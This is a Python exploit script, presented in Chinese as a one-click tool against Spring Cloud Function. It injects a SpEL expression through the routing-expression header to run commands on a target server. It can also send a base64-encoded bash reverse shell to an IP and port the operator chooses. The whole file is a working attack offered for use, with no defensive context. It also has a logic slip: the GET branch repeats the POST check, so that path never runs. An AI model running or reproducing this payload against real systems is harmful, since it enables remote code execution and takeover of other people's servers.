import requests
import argparse
import base64

class Exp:

    def __init__(self):

        parser = argparse.ArgumentParser(description="spring cloud function 一键利用工具! by charis 博客http://www.charis3306.top/")
        parser.add_argument('--check', type=str, required=True, help="检测方式post或get方式,--check get --check post")
        parser.add_argument('--route', type=str, default='functionRouter', help="检测路由，默认是functionRouter")
        parser.add_argument('--url', type=str, required=True, help="输入利用的url")
        parser.add_argument('--ip', type=str, help="反弹shell地址ip")
        parser.add_argument('--port', type=str, help="反弹shell地址端口")
        parser.add_argument('--proxies', type=str, default='', help="启用代理")
        parser.add_argument('--cmd', type=str, help="要执行的命令")

        self.checkOption = parser.parse_args().check
        self.route = parser.parse_args().route
        self.url = parser.parse_args().url
        self.ip = parser.parse_args().ip
        self.port = parser.parse_args().port
        self.cmd = parser.parse_args().cmd
        self.proxies = parser.parse_args().proxies

        self.vurl = self.url + self.route

        if self.ip and self.port:
            self.s = "bash -i >& /dev/tcp/"+str(self.ip)+"/"+ str(self.port) +" 0>&1"
            self.exp = "bash -c {echo,"+str(str(base64.b64encode(self.s.encode("utf-8")), "utf-8"))+"}|{base64,-d}|{bash,-i}"
        elif self.cmd:
            self.exp = "bash -c {echo,"+str(str(base64.b64encode(self.cmd.encode("utf-8")), "utf-8"))+"}|{base64,-d}|{bash,-i}"
        else:
            self.exp = ""

        self.headers = {
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("'+ str(self.exp) +'")',
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "0",
            "Connection": "close",
        }

        self.proxies = {
            "http": f"{self.proxies}"
        }

    def check(self) -> str:

        if str(self.checkOption).lower() == "get":
            if self.Get_status_code() == 500:
                return "get"
        elif str(self.checkOption).lower() == "post":
            if self.Post_status_code() == 500:
                return "post"
        else:
            print('\033[32mINFO [-] 不存在漏洞\033[0m')

    def exploitation(self):
        if self.check() != None:
            print('\033[32mINFO [+]\033[0m \033[31m可能存在漏洞\033[0m')
            if self.check().lower() == "post":
                try:
                    if self.proxies != "":
                        requests.packages.urllib3.disable_warnings()
                        requests.post(self.vurl, headers=self.headers, verify=False, proxies=self.proxies)
                    else:
                        requests.packages.urllib3.disable_warnings()
                        requests.post(self.vurl, headers=self.headers, verify=False)
                    print("\033[32mINFO [*] 利用完成！\033[0m")
                except requests.exceptions.ConnectionError as e:
                    print('\033[32mINFO [-] 不存在漏洞或建立连接失败！\033[0m')
            elif self.check().lower() == "post":
                try:
                    if self.proxies != "":
                        requests.packages.urllib3.disable_warnings()
                        requests.get(self.vurl, headers=self.headers, verify=False, proxies=self.proxies)
                    else:
                        requests.packages.urllib3.disable_warnings()
                        requests.get(self.vurl, headers=self.headers, verify=False)
                    print("\033[32mINFO [*] 利用完成！\033[0m")
                except requests.exceptions.ConnectionError as e:
                    pass
            else:
                print('\033[32mINFO [-] 不存在漏洞或建立连接失败！\033[0m')

    def Post_status_code(self) -> int:
        try:
            if self.proxies != "":
                requests.packages.urllib3.disable_warnings()
                return requests.post(self.vurl, verify=False, proxies=self.proxies).status_code
            else:
                requests.packages.urllib3.disable_warnings()
                return requests.post(self.vurl, verify=False).status_code
        except requests.exceptions.ConnectionError as e:
            print('\033[32mINFO [-] 不存在漏洞或建立连接失败！\033[0m')

    def Get_status_code(self) -> int:
        try:
            if self.proxies != "":
                requests.packages.urllib3.disable_warnings()
                return requests.get(self.vurl, verify=False, proxies=self.proxies).status_code
            else:
                requests.packages.urllib3.disable_warnings()
                return requests.get(self.vurl, verify=False).status_code
        except requests.exceptions.ConnectionError as e:
            print('\033[32mINFO [-] 不存在漏洞或建立连接失败！\033[0m')


if __name__ == '__main__':
    Exp().exploitation()